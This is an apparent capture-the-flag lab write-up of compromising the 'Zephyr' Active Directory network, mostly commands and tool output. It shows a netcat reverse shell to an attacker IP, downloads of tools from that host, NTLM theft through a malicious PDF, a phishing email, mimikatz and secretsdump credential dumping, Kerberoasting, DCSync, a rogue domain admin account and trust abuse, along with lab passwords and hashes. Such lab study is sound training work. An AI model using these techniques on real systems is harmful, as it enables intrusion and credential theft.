
Subnet: 10.10.110.0/24

10.10.110.2 is out-of-scope because it represents the firewall.

---
## ZEPHYR-MAIL [x]

Started off with host disocvery on the subnet.

```
nmap -sn 10.10.110.0/24 --min-rate 1000
```

Discovered the initial entry point 10.10.110.35

Let's start an port scan on it.

```
nmap -n -Pn -sSCV -p- -oA nmap/target 10.10.110.35
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-29 11:25 -0500
Nmap scan report for 10.10.110.35
Host is up (0.098s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:ca:e7:7e:99:03:a9:78:e8:86:2e:e8:cc:2b:9f:08 (RSA)
|   256 b1:7f:c0:06:9b:e7:08:b4:6a:ab:bd:c2:96:04:23:49 (ECDSA)
|_  256 0d:3b:89:bc:d5:a4:35:e0:dd:c4:22:14:7a:48:ad:7c (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://painters.htb/home
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://painters.htb/home
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=painters.htb/countryName=GB
| Subject Alternative Name: DNS:mail.painters.htb, IP Address:192.168.110.51
| Not valid before: 2022-04-04T10:00:52
|_Not valid after:  2032-04-01T10:00:52
| tls-nextprotoneg: 
|   h2
|_  http/1.1
| tls-alpn: 
|   h2
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 189.86 seconds
```

The scan revealed that the target server seems to be an Linux Environment. It also reveals the SAN "mail.painters.htb". The target is probably ZEPHYR-MAIL. Which makes sense since Mailservers are most of the times inside the DMZ. It also reveals an redirect to painters.htb. Let's map the SAN & the domain to the target ip address in our local dns file. 

```
echo "10.10.110.35 mail.painters.htb painters.htb" | tee -a /etc/hosts
```

Upon inspecting the webpage we found 3 potential usernames.

```
Thomas Bishop
James Ray
Toby Harlington
```

Enumerated endpoints using gobuster and found interesting endpoints. Including /administration which seems to be an login panel & /vacancies endpoint which reveals information about another username.

```
Ralph Davies
```

Let's create an users wordlist out of them using the following username generator:

```
git clone https://github.com/florianges/UsernameGenerator
```

Stored all of the users in newusers.txt and then ran the following command to generate multiple usernames for bruteforcing:

```
UsernameGenerator.py newusers.txt users.txt
```

Since we don't got any passwords yet. Let's create an passwords.txt wordlist by utilizing an tool called cewl which crawls the whole website.

```
cewl http://painters.htb -x 15 -o -w passwords.txt
```

Before starting up bruteforcing the /administration endpoint. Let's try & enumerate subdomains with ffuf.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://painters.htb -H "Host: FUZZ.painters.htb" -fs 0
```

Couldn't find anything interesting let's proceed enumeration of endpoints with dirsearch & feroxbuster.

```
dirsearch -u http://painters.htb
```

Running feroxbuster was a bit more promising, since it discovered another admin panel or the same, but on another endpoint!

```
http://painters.htb/views/admin/
```

Alright let's start with bruteforcing the webpanel using hydra. We'll need to intercept traffic with Our Web-Proxy Tool BurpSuite first in order to prepare necessary stuff for hydra.

```
username=&pass=
```

Bruteforced the admin panel.

```
hydra -L creds/users.txt -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt painters.htb http-post-form "/administration/login:username=^USER^&pass=^PASS^:F=Incorrect Username or Password"
```

This didn't work. Upon accessing /vacancies endpoint I found an interesting upload functionality! It allows to upload PDF Files. Let's perform an Relay Attack.

Could we perform an NTLM Relay Attack?

1. Started up Responder on local machine

```
responder -I tun0
```

2. Utilized ntlm_theft.py in order to generate an malicious PDF File.

```
python3 ntlm_theft.py --generate pdf --server 10.10.14.121 --file important
```

3. Uploaded the PDF File on to the webpage.

Captured NTLM Hash of user "riley".

```
riley::PAINTERS:44c2d7225c629dc6:67EDABE3A6EF3A01DF5C147EAD399C96:0101000000000000000346212820DD010A9D03B7BD4BE2570000000002000800420036005600350001001E00570049004E002D004F0034004400490047004800300038004D003600580004003400570049004E002D004F0034004400490047004800300038004D00360058002E0042003600560035002E004C004F00430041004C000300140042003600560035002E004C004F00430041004C000500140042003600560035002E004C004F00430041004C0007000800000346212820DD010600040002000000080030003000000000000000000000000020000012CBE2BA1E4B24CBDC155D522AC3254D08144566D36C2032B68B7A224CCC0F480A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100320031000000000000000000
```

Cracked the NTLM Hash using john the ripper & retrieved an password.

```
john riley --wordlist=/usr/share/wordlists/rockyou.txt
```

```
riley:P@ssw0rd
```

Connected to the target server via SSH.

```
ssh riley@10.10.110.35
```

Retrieved flag.txt in /home/riley directory.

```
ZEPHYR{HuM4n_3rr0r_1s_0uR_D0wnf4ll}
```
## Privilege Escalation

Enumerated Database Credentials in /var/www/painters/models/DatabaseModel.php

```
riley:PainterDBPassword2022
```

Enumerated running MySQL Database.

```
netstat -tulnp
```

Connected to the database internally.

```
mysql -u riley -p 
```

Enumerated Database Credentials of user "admin".

```
show databases;
use painter;
show tables;
SELECT * FROM users;
```

```
admin:$2y$10$7BLIFYjCq4PF0U3ZH86b1eQLfO9EEIO.GRQMKM5XX02FAbBFd95j2
```

I inspected the running services again & realised there is a lot of mail services running. Every user also has an dedicated "Maildir" directory, in which all mails are being stored. Could we perform an phishing attack to get more credentials?

Before we will do this, let's proceed with enumerating the target server manually.

Transfered suid3num.py in order to enumerate SUID Binarys for Privilege Escalation.

1. Started up python3 webserver on my local machine.

```
wget http://10.10.14.121/suid3num.py suid3num.py
```

2. Gave the script executable permissions & ran it, but couldn't find anything useful.

```
chmod +x suid3num.py
python3 suid3num.py
```

Transfered LinPEAS onto the target.

```
wget http://10.10.14.121/linpeas.sh linpeas.sh
```

LinPEAS revealed that the target seems vulnerable to PwnKit. Let's abuse it.

```
wget http://10.10.14.121/PwnKit PwnKit
```

Didn't work. I decided to enumerate the "Maildir" Directory inside user rileys home directory. It had an interesting file in which user matt wrote an mail to riley with his password, but it's blank!

Downloaded the file.

```
scp riley@10.10.110.35:/home/riley/Maildir/cur/important_mail .
```

But this didn't display the password. Let's perform an Phishing Attack in which we send an mail as user 

We're gonna use this as layout to call an reverse connection to our responder.

```
swaks --to matt@painters.htb --from "IT-Support@painters.htb" --server 10.10.110.35 --header "Subject: Urgent: Security Update Required" --header "Content-Type: text/html" --body '<html><body><img src="\\10.10.14.121\share\logo.png"><a href="\\10.10.14.121\share\update.pdf">Update Now</a></body></html>'
```

This didn't work. I was also not able to connect to the Mail Services. Since I previously discovered the machine seems to be dual-hosted. Let's proceed with pivoting into the internal network!

1. Created Proxy Interface

```
ip tuntap add user saitama mode tun ligolo && ip link set ligolo up && ligolo-proxy -selfcert -laddr 0.0.0.0:80
```

2. Downloaded Transfered Linux Proxy Agent onto target server.

```
wget http://10.10.14.121/linux_agent_amd64_x86 linux_correct_agent
```

3. Connected from the target machine to my local proxy.

```
./linux_agent -connect 10.10.14.121:80 -ignore-cert
```

4. Started tunnel.

```
session
start --tun ligolo
```

5. Added route.

```
ip route add 192.168.110.0/24 dev ligolo
```

After I comprimised the Domain Controller I've received the plaintext password of user matt. Connected to the target machine as user "matt" via SSH.

```
ssh matt@10.10.110.35
```

It seems user matt has full sudo permissions without authentication. Let's login as root user.

```
sudo -l
[sudo] password for matt: 
Matching Defaults entries for matt on mail:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User matt may run the following commands on mail:
    (ALL : ALL) ALL
```

```
sudo su
```

Retrieved flag.txt in /root directory.

```
ZEPHYR{L34v3_N0_St0n3_Un7urN3d}
```

---
## Host Discovery

Performed Ping Sweeps now. There seems to be 5 endpoints open!

```
for i in {1..254} ;do (ping -c 1 192.168.110.$i | grep "bytes from" &) ;done
64 bytes from 192.168.110.51: icmp_seq=1 ttl=64 time=21.5 ms
64 bytes from 192.168.110.52: icmp_seq=1 ttl=64 time=21.3 ms
64 bytes from 192.168.110.53: icmp_seq=1 ttl=64 time=18.7 ms
64 bytes from 192.168.110.54: icmp_seq=1 ttl=64 time=22.7 ms
64 bytes from 192.168.110.55: icmp_seq=1 ttl=64 time=20.0 ms
```

Scanned all Ports on the newly discovered endpoints.

```
nmap -n -Pn -sSCV -p- 192.168.110.52-55
```

---
## ZEPHYR-PNTSVC [x]

An initial scan revealed the following information about the target endpoint.

```
Nmap scan report for 192.168.110.52
Host is up (0.047s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-30T21:56:23
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: PNT-SVRSVC, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:20:e3:1a (unknown)
```

Sprayed Credentials as anonymous & guest user but both are either disabled or access is denied.

```
nxc smb 192.168.110.52 -u 'guest' -p '' --shares
```

Sprayed credentials with the previously discovered users and passwords and was able to authenticate as user "riley" and enumerated shares. But there is no interesting share.

```
nxc smb 192.168.110.52 -u riley -p 'P@ssw0rd' --shares
```

Tried connecting via rpcclient, but access got denied.

```
rpcclient -U 'riley%P@ssw0rd' 192.168.110.52
```

Since there is nothing open no more, let's try & move to the next target for now.

Since we previously discovered that we can connect via evil-winrm as web_svc I decided to connect to the target.

```
evil-winrm -i 192.168.110.52 -u web_svc -p '!QAZ1qaz'
```

It looks like we are part of the Administrators Group!

Retrieved flag.txt in C:\Users\Administrator\Desktop.

```
ZEPHYR{S3rV1c3_AcC0Un7_5PN_Tr0uBl35}
```

Enumerated users and found out about an local user named "James". Let's try & perform post exploitation.

Therefore I first wanna get an better shell. Let's transfer nc.exe onto the target server.

Started up python3 webserver in the directory in which nc.exe is stored.

```
python3 -m http.server 80
```

Transfered nc.exe onto the target server.

```
iwr -uri http://10.10.14.121:443/nc.exe -OutFile nc.exe
```

Started up listener on port 53.

```
rlwrap nc -lvnp 53
```

Executed the following command on the target server.

```
./nc.exe 10.10.14.121 53 -e cmd.exe
```

Gained RCE.

```
rlwrap nc -lvnp 53 
listening on [any] 53 ...
connect to [10.10.14.121] from (UNKNOWN) [10.10.110.35] 32126
Microsoft Windows [Version 10.0.20348.5139]
(c) Microsoft Corporation. All rights reserved.

C:\Temp>
```

Transfered mimikatz.exe onto the target server.

```
certutil -urlcache -split -f http://10.10.14.121:443/mimikatz.exe mimikatz.exe
```

Tried checking for passwords. But couldn't retrieve anything.

```
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

Extracted the SAM & SYSTEM File out of registry for dumping hashes.

```
reg save hklm\sam C:\Temp\SAM
reg save hklm\sam C:\Temp\SYSTEM
```

Downloaded them onto my local machine.

```
download SAM
download SYSTEM
```

Dumped all Hashes from memory and stored them in hashes.txt

```
impacket-secretsdump -system SYSTEM -sam SAM local
```

Since James isn't an domain user let's spray for winrm access with --local-auth flag.

We pwned PNT-SVRBPA!

```
nxc winrm 192.168.110.53 -u users.txt -H hashes.txt --continue-on-success --local-auth
```

Let's check if we can pwn SMB there aswell, so we have instant SYSTEM Shell. We do!

```
nxc smb 192.168.110.53 -u users.txt -H hashes.txt --continue-on-success --local-auth
```


---
## PNT-SVRBPA [x]

An initial scan revealed the following information about the target endpoint.

```
Nmap scan report for 192.168.110.53
Host is up (0.025s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1s
|_nbstat: NetBIOS name: PNT-SVRBPA, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:ae:d4:5b (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-30T21:56:22
|_  start_date: N/A
```

Sprayed Credentials and found out riley is authenticated again. I'm assuming those are domain credentials. But unfortunately no interesting non-defaut SMB Share is active.

```
nxc smb 192.168.110.53 -u users.txt -p passwords.txt --shares
```

Same play like on the previous endpoint, we can't winrm into the target & can't access via rpcclient. Let's move on to the next target.

Since we gained James Credentials, we can login via psexec.

```
impacket-psexec James@192.168.110.53 -hashes :8af1903d3c80d3552a84b6ba296db2ea
```

Retrieved flag.txt in C:\Users\Administrator\Desktop.

```
ZEPHYR{P3r5isT4nc3_1s_k3Y_4_M0v3men7}
```

I downloaded winPEAS onto the target server and it provided me credentials.

```
dfm.a:Password123!
```

Transfered mimikatz.exe onto the target server.

```
certutil -urlcache -split -f http://10.10.14.121:443/mimikatz.exe mimikatz.exe
```

Couldn't retrieve any useful passwords or anything.

I decided to mark all endpoints I comprimised as owned in BloodHound and found an interesting DACL for user Blake. PNT-SRVBPA has GenericWrite & ForceChangePassword for user Blake!

We'll need to get the NTLM Hash for the Machine Account of PNT-SRVBPA for this endavour. Retrieved it out of mimikatz

```
PNT-SRVBPA$:2dfcebbe9f5f4cb3bf98032887b3d7b6
```

Tried to perform an Shadow Credential Attack, but it seems like it didn't work.

```
certipy-ad shadow auto -u 'PNT-SRVBPA$@painters.htb' -hashes :2dfcebbe9f5f4cb3bf98032887b3d7b6 -account blake -dc-ip 192.168.110.55
```

Successfully abused ForceChangePassword. Changed blake's password with bloodyad.

```
bloodyad -u PNT-SVRBPA$ -p :2dfcebbe9f5f4cb3bf98032887b3d7b6 -d painters.htb --host dc.painters.htb set password blake 'Pass123!'
```

Verified if it worked & it did!

```
nxc smb 192.168.110.55 -u blake -p 'Pass123!'
```

We sprayed PNTSRVPSB & found out we pwned the box on winrm.

```
nxc winrm 192.168.110.54 -u blake -p 'Pass123!'
```

---
## PNT-SVRPSB [x]

An initial scan revealed the following information about the target endpoint.

```
Nmap scan report for 192.168.110.54
Host is up (0.024s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Since we are now authenticated as blake after comprising a couple of machines, let's connect via evil-winrm to the target machine.

```
evil-winrm -i 192.168.110.54 -u blake -p 'Pass123!'
```

Apparently we seem to be part of the Administrator Group.

Retrieved flag.txt in C:\Users\Administrator\Desktop.

```
ZEPHYR{7h3_Tru57_h45_B3eN_Br0k3n}
```

We can also see that user blake has "AllowedToDelegate" ACL onto the Doamin Controller.

This attack requests an TGT for the victim user and executes the S4U2self/S4U2proxy proccess to impersonte the admin user. 

1. Request Ticket

```
getST.py painters.htb/blake:'Pass123!' -spn CIFS/dc.painters.htb -impersonate administrator -altservice 'cifs'
```

2. Export .ccache ticket into Kerberos Variable

```
export KRB5CCNAME=administrator@cifs_dc.painters.htb@PAINTERS.HTB.ccache
```

2. Perform DCSync Attack to dump all Domain Hashes

```
impacket-secretsdump -k -no-pass 'painters.htb/Administrator'@dc.painters.htb
```

We retrieved all Hashes & the cleartext password for user matt!

```
matt:L1f30f4Spr1ngCh1ck3n!
```

---
## ZEPHYR-DC [x]

An initial scan revealed the following information about the target endpoint.

```
Nmap scan report for 192.168.110.55
Host is up (0.037s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-30 21:55:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: painters.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: painters.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
10050/tcp open  tcpwrapped
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
65055/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
65064/tcp open  msrpc         Microsoft Windows RPC
65068/tcp open  msrpc         Microsoft Windows RPC
65083/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-30T21:56:23
|_  start_date: N/A
|_nbstat: NetBIOS name: DC, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:84:0d:23 (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Post-scan script results:
| clock-skew: 
|   0s: 
|     192.168.110.52
|_    192.168.110.55
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 4 IP addresses (4 hosts up) scanned in 982.73 seconds
```

The target seems to be an Domain Controller.

Enumerated SMB Shares, but couldn't find anything interesting.

```
nxc smb 192.168.110.55 -u users.txt -p passwords.txt --shares
```

Decided to check out ACL's of users using bloodhound. Downloaded domain information.

```
bloodhound-python -u riley -p 'P@ssw0rd' -ns 192.168.110.55 -d painters.htb -c all
```

Started bloodhound.

```
bloodhound-start
```

Uploaded domain information. Marked our current user "riley" as owned. But couldn't find any outbound object controls.

Queried for kerberoastable users & found two!

```
blake
web_svc
```

Let's get there TGT's, this failed with KDC_ERR_ETYPE_NOSUPP.

```
impacket-GetUserSPNs -request -dc-ip 192.168.110.55 painters.htb/riley
```

Enumerated domain users and saved the output in an newusers.txt file.

```
nxc smb 192.168.110.55 -u 'riley' -p 'P@ssw0rd' --rid-brute > newusers.txt
```

Formatted the wordlist and stored it inside an users.txt, for future bruteforcing.

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

Since we couldn't elevate privileges I decided to download domain information using rusthound for potential ADCS Priv Esc!

```
rusthound-ce --domain painters.htb -u riley -p 'P@ssw0rd'
```

Uploaded Rusthound Domain Information in BloodHound, but couldn't find anything related again.

Since the normal kerberoast didn't work I decided to perform an "targeted" Kerberoast and it worked, stored it inside an web_svc file on my local machine.

```
python3 /opt/arsenal/ActiveDirectory/targetedKerberoast/targetedKerberoast.py -v -d 'painters.htb' -u 'riley' -p 'P@ssw0rd' --dc-host dc.painters-htb --request-user web_svc
```

Cracked the TGT of web_svc & gained his password.

```
hashcat -m 19700 web_svc /usr/share/wordlists/rockyou.txt
```

```
web_svc:!QAZ1qaz
```

Let's try & get blake's TGT aswell! We got it!

```
python3 /opt/arsenal/ActiveDirectory/targetedKerberoast/targetedKerberoast.py -v -d 'painters.htb' -u 'web_svc' -p '!QAZ1qaz' --dc-host dc.painters-htb --request-user blake
```

Tried bruteforcing it, but couldn't find an result unfortunately.

```
hashcat -m 19700 blake /usr/share/wordlists/rockyou.txt
```

Let's spray users again, we couldn't connect to the DC for now. So I decided to spray agaisnt the other endpoints & got an hit on PNT-SVRSVC for web_svc

```
nxc winrm 192.168.110.52 -u users.txt -p passwords.txt --continue-on-success
```

Since we were able to perform an DCSync Attack with the Administrator .ccache ticket which we retrieved through user blake & AllowedToDelegate ACL. We got the Domain Admin Hash. Let's verify if we can comprimise the DC using it. We can!

```
nxc winrm dc.painters.htb -u Administrator -H 5bdd6a33efe43f0dc7e3b2435579aa53
```

Connected to the Domain Controller.

```
evil-winrm -i dc.painters.htb -u Administrator -H 5bdd6a33efe43f0dc7e3b2435579aa53
```

Retrieved flag.txt in C:\Users\Administrator\Desktop.

```
ZEPHYR{P41n73r_D0m41n_D0m1n4nc3}
```

Since we already performed post exploitation regarding credentials. Let's check if the target is dual-hosted. So we can potentially pivot into more internal endpoints. It's not unfortunately. 

Let's check for established connections or any hints.

```
netstat -ano
```

Revealed that there seems to be an established connection to an foreign address: 192.168.210.13

Let's setup an double pivot using ligolo-ng.

Started second ligolo interface on port 443 on my local machine.

```
sudo ip tuntap add user saitama mode tun ligolo-double && sudo ip link set ligolo-double up && ligolo-proxy -selfcert -laddr 0.0.0.0:443
```

Transfered agent.exe onto the Domain Controller & executed the following reverse connection to my proxy.

```
./agent.exe -connect 10.10.14.121:443 -ignore-cert
```

Added route on local machine.

```
ip route add 192.168.210.0/24 dev ligolo-double
```

---
## Host Discovery

```
for i in {1..254} ;do (ping -c 1 192.168.210.$i | grep "bytes from" &) ;done
```

Enumerated 4 endpoints.

```
64 bytes from 192.168.210.10: icmp_seq=1 ttl=64 time=26.9 ms
64 bytes from 192.168.210.12: icmp_seq=1 ttl=64 time=25.9 ms
64 bytes from 192.168.210.13: icmp_seq=1 ttl=64 time=21.1 ms
64 bytes from 192.168.210.16: icmp_seq=1 ttl=64 time=21.9 ms
```

---
## ZPH-SVRDC01

An initial scan revealed the following information about the running services on the target server.

```
nmap -n -Pn -sSCV -p- 192.168.210.10 192.168.210.12-13 192.168.210.16
Nmap scan report for 192.168.210.10
Host is up (0.028s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: zsm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ZPH-SVRDC01.zsm.local
| Not valid before: 2026-01-21T08:07:22
|_Not valid after:  2042-03-16T16:45:14
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: zsm.local, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ZPH-SVRDC01.zsm.local
| Not valid before: 2026-01-21T08:07:22
|_Not valid after:  2042-03-16T16:45:14
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: zsm.local, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ZPH-SVRDC01.zsm.local
| Not valid before: 2026-01-21T08:07:22
|_Not valid after:  2042-03-16T16:45:14
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: zsm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ZPH-SVRDC01.zsm.local
| Not valid before: 2026-01-21T08:07:22
|_Not valid after:  2042-03-16T16:45:14
|_ssl-date: TLS randomness does not represent time
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
54578/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
54582/tcp open  msrpc         Microsoft Windows RPC
54586/tcp open  msrpc         Microsoft Windows RPC
54592/tcp open  msrpc         Microsoft Windows RPC
54600/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ZPH-SVRDC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-01T01:32:06
|_  start_date: N/A
|_clock-skew: 2s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

Sprayed anonymous, guest & all passwords. But nothing worked. Also sprayed hashes, but didn't work either. So I guess let's check the other targets first.

After comprimising ZEPHYR-ZABBIX we gained domain user credentials for marcus and were able to authenticate against the new forest "zsm.local". Let's therefore start with enumerating all domain users & downloading bloodhound information using rusthound!

Stored the output in an newusers.txt file on my local machine.

```
nxc smb 192.168.210.10 -u marcus -p '!QAZ2wsx' --rid-brute > newusers.txt
```

Formatted the file so we can utilize the users.txt wordlist for future bruteforce attacks.

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

Downloaded domain information.

```
rusthound-ce --domain zsm.local -u marcus -p '!QAZ2wsx' -i 192.168.210.10
```

Upon viewing bloodhound and marking user marcus as owned, we found plenty of interesting ACL's.

1. ForceChangePassword on user "jamie".
2. AddKeyCredentialLink on ZEPHYR-MGMT
3. Enroll in ZEPHYR-CA

Since CA Managers include the ca_svc service account we wanted to request the NTLM Hash of it, but this didn't work.

Let's try & abuse the 2. ACL AddKeyCredentialLink on ZEPHYR-MGMT

It means we can create shadow credentials and get the machine account's NTLM Hash

```
certipy-ad shadow auto -u marcus@zsm.local -p '!QAZ2wsx' -account ZPH-SVRMGMT1$ -dc-ip 192.168.210.10
```

We now can authenticate as machine account.

I added the machine account to the general management group.

```
bloodyad -u ZPH-SVRMGMT1$ -p :89d0b56874f61ad38bad336a77b8ef2f -d zsm.local --host 192.168.210.10 add groupMember 'General Management' ZPH-SVRMGMT1$
```

Changed Password of user jamie.

```
bloodyad -u ZPH-SVRMGMT1$ -p :89d0b56874f61ad38bad336a77b8ef2f -d zsm.local --host 192.168.210.10 set password jamie 'password123!'
```

Added user jamie to CA Managers Group.

```
bloodyAD -u jamie -p 'password123!' -d zsm.local --host 192.168.210.10 add groupMember 'CA Managers' jamie
```

Now since I couldn't exploit this further yet I decided to try & login into ZEPHYR-MGMT

After comprimising the Domain Controller ZEPHYR-CDC I got an hint from another user that internal.zsm.local and zsm.local have "Domain Trust Abuse", which means we should be able to pwn the zsm.local domain from internal.zsm.local!

I connected to ZEPHYR-CDC as Domain Admin via psexec & gained SYSTEM Shell.

```
impacket-psexec Administrator@192.168.210.16 -hashes aad3b435b51404eeaad3b435b51404ee:543beb20a2a579c7714ced68a1760d5e
```
## Domain Trust Abuse

1. Let's first create an Domain Admin User

Created user

```
net user /add saitama password123! /domain
```

Added to Domain Admins Group

```
net group "Domain Admins" saitama /add /domain
```

Reassure if change is successfull:

```
net group "Domain Admins"
```

2. Checking if Domain Trust is bidirectional

```
Get-ADTrust -Filter *
```

2. We now need the NTLM Hash of internal/krbtgt

```
impacket-secretsdump internal.zsm.local/Administrator@192.168.210.16 -hashes aad3b435b51404eeaad3b435b51404ee:543beb20a2a579c7714ced68a1760d5e -just-dc-user internal/krbtgt          
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0540fe51ddd618f42a66ef059ac36441:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:3bdcbeb0910e5887e6d6c7fbec6c3f29e1e099322ac91cc386ca296a5c5497b0
krbtgt:aes128-cts-hmac-sha1-96:b6252a6e5ec060751a03c1a73ef2af4e
krbtgt:des-cbc-md5:92755ef7ce8a6e16
[*] Cleaning up...
```

4. We need to transfer PowerView.ps1 for this.

```
iwr -uri http://10.10.14.63:445/PowerView.ps1 -OutFile PowerView.ps1
```

5. Import Module

```
Import-Module .\PowerView.ps1
```

 6. Get SID of Child Domain (internal.zsm.local)

```
Get-DomainSID
S-1-5-21-3056178012-3972705859-491075245
```

7. Create Credential Object out of an comprimised Domain User of the "Target" Domain 

```
$secpass = ConvertTo-SecureString '!QAZ2wsx' -AsPlainText -Force
```

```
$marcus = New-Object System.Management.Automation.PSCredential('zsm.local\marcus', $secpass)
```

```
$marcus.UserName
```

8. Find the SID of Enterprise Admins Group at PARENT Domain

```
PS C:\Temp> Get-DomainGroup "Enterprise *" -Cred $marcus 
Get-DomainGroup "Enterprise *" -Cred $marcus 


grouptype              : UNIVERSAL_SCOPE, SECURITY
admincount             : 1
name                   : Enterprise Admins
samaccounttype         : GROUP_OBJECT
samaccountname         : Enterprise Admins
whenchanged            : 15/03/2022 15:35:44
objectsid              : S-1-5-21-2734290894-461713716-141835440-519
objectclass            : {top, group}
cn                     : Enterprise Admins
instancetype           : 4
usnchanged             : 12754
dscorepropagationdata  : {15/03/2022 15:35:44, 15/03/2022 15:20:34, 01/01/1601 00:04:16}
iscriticalsystemobject : True
description            : Designated administrators of the enterprise
memberof               : {CN=Denied RODC Password Replication Group,CN=Users,DC=zsm,DC=local, 
                         CN=Administrators,CN=Builtin,DC=zsm,DC=local}
member                 : CN=Administrator,CN=Users,DC=zsm,DC=local
usncreated             : 12339
whencreated            : 15/03/2022 15:20:34
